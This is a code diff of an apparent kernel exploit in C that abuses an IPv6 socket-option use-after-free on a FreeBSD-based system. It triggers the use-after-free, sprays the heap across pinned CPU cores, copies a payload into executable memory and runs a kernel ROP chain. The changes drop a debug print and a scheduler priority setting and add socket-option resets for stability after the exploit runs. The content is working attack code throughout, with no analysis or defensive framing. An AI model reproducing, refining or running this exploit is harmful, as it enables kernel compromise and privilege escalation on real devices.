@@ -1,4 +1,3 @@
-#include <sched.h>  // Added for sched_setscheduler
 #include <sys/types.h>
 #include <stdio.h>
 #include <sys/socket.h>
@@ -19,7 +18,6 @@
 #define IPV6_2292PKTINFO 19
 #define IPV6_2292PKTOPTIONS 25
 #define TCLASS_MASTER 0x13370000
-#define TCLASS_MASTER_2 0x73310000
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
 #define SPRAY_SIZE 32
@@ -52,13 +50,6 @@ int set_tclass(int s, int val) {
     if (setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
         *(volatile int*)0;
     return 0;
-}
-
-int get_rthdr(int s, char* buf, int len) {
-    socklen_t l = len;
-    if (getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
-        *(volatile int*)0;
-    return l;
 }
 
 int get_pktinfo(int s, char* buf) {
@@ -138,7 +129,6 @@ void trigger_uaf(struct opaque* o) {
         nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL);
     }
 
-    printf("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
     o->triggered = 1;
     while (!o->done1 || !o->done2);
 }
@@ -211,16 +201,22 @@ void sidt(unsigned long long* addr, unsigned short* size) {
 }
 
 
-// Assign the process to a specific core and set priority
+// Assign the process to a specific core
 void pin_to_cpu(int cpu) {
     cpuset_t set;
     CPU_ZERO(&set);
     CPU_SET(cpu, &set);
     cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
-
-    struct sched_param sp = { .sched_priority = 70 };
-    sched_setscheduler(0, SCHED_RR, &sp);
 }
+
+static void reset_ipv6_opts(int s) {
+    int tclass = -1;
+    setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
+    setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
+    struct in6_pktinfo z = {0};
+    setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
+}
+
 
 // External inputs from gadgets and ROP buffers
 void (*enter_krop)(void);
@@ -330,21 +326,20 @@ for (int attempts = 0; attempts < 10; attempts++) {
     set_pktinfo(master_sock, buf);
 
     enter_krop();
-	nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
+    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
     break; // Successful exploit run ROP Chain
-	}
-
+}
     // Map spray to ROP execution
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
-	
+
 	size_t spray_size = spray_stop - spray_start; // Check spray_size
 	if (spray_size == 0 || spray_size > 0x10000)
     *(volatile int*)0;
-	
+
     char* spray_map = mmap(0, spray_stop - spray_start, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
     if (spray_map == MAP_FAILED)
-        *(volatile int*)0; 
+        *(volatile int*)0;
 
     for (size_t i = 0; i < spray_stop - spray_start; i++)
         spray_map[i] = spray_start[i];
@@ -352,17 +347,28 @@ for (int attempts = 0; attempts < 10; attempts++) {
     // Run malloc sprays for pinned cores
 	pin_to_cpu(1);
 	rop_call_funcptr(spray_map, spray_sock, kernel_base); // Core 1 for spray_sock overlap
-    
+
     for (int cpu = 2; cpu < 7; cpu++) {
         pin_to_cpu(cpu);
         rop_call_funcptr(spray_map, NULL, kernel_base); // Remaining cores for malloc sprays (Heap Grooming)
     }
+
+    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL); // ~100ms
+
+    struct in6_pktinfo safe = {0};
+    set_pktinfo(master_sock, (char*)&safe);
+
+    for (int i = 0; i < SPRAY_TOTAL; i++) if (spray_sock[i] >= 0) reset_ipv6_opts(spray_sock[i]);
+    reset_ipv6_opts(master_sock);
+    reset_ipv6_opts(kevent_sock);
+
 
     cleanup_sockets(spray_sock, SPRAY_TOTAL);
     close(kevent_sock);
     close(master_sock);
     munmap(spray_map, spray_size);
 
-	nanosleep("\0\0\0\0\0\0\0\0\x00\x00\x20\xA1\07\0\0\0", NULL); // Safety exit
+    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\x20\xA1\07\0\0\0", NULL); // Safety exit
+
 	return 0;
 }
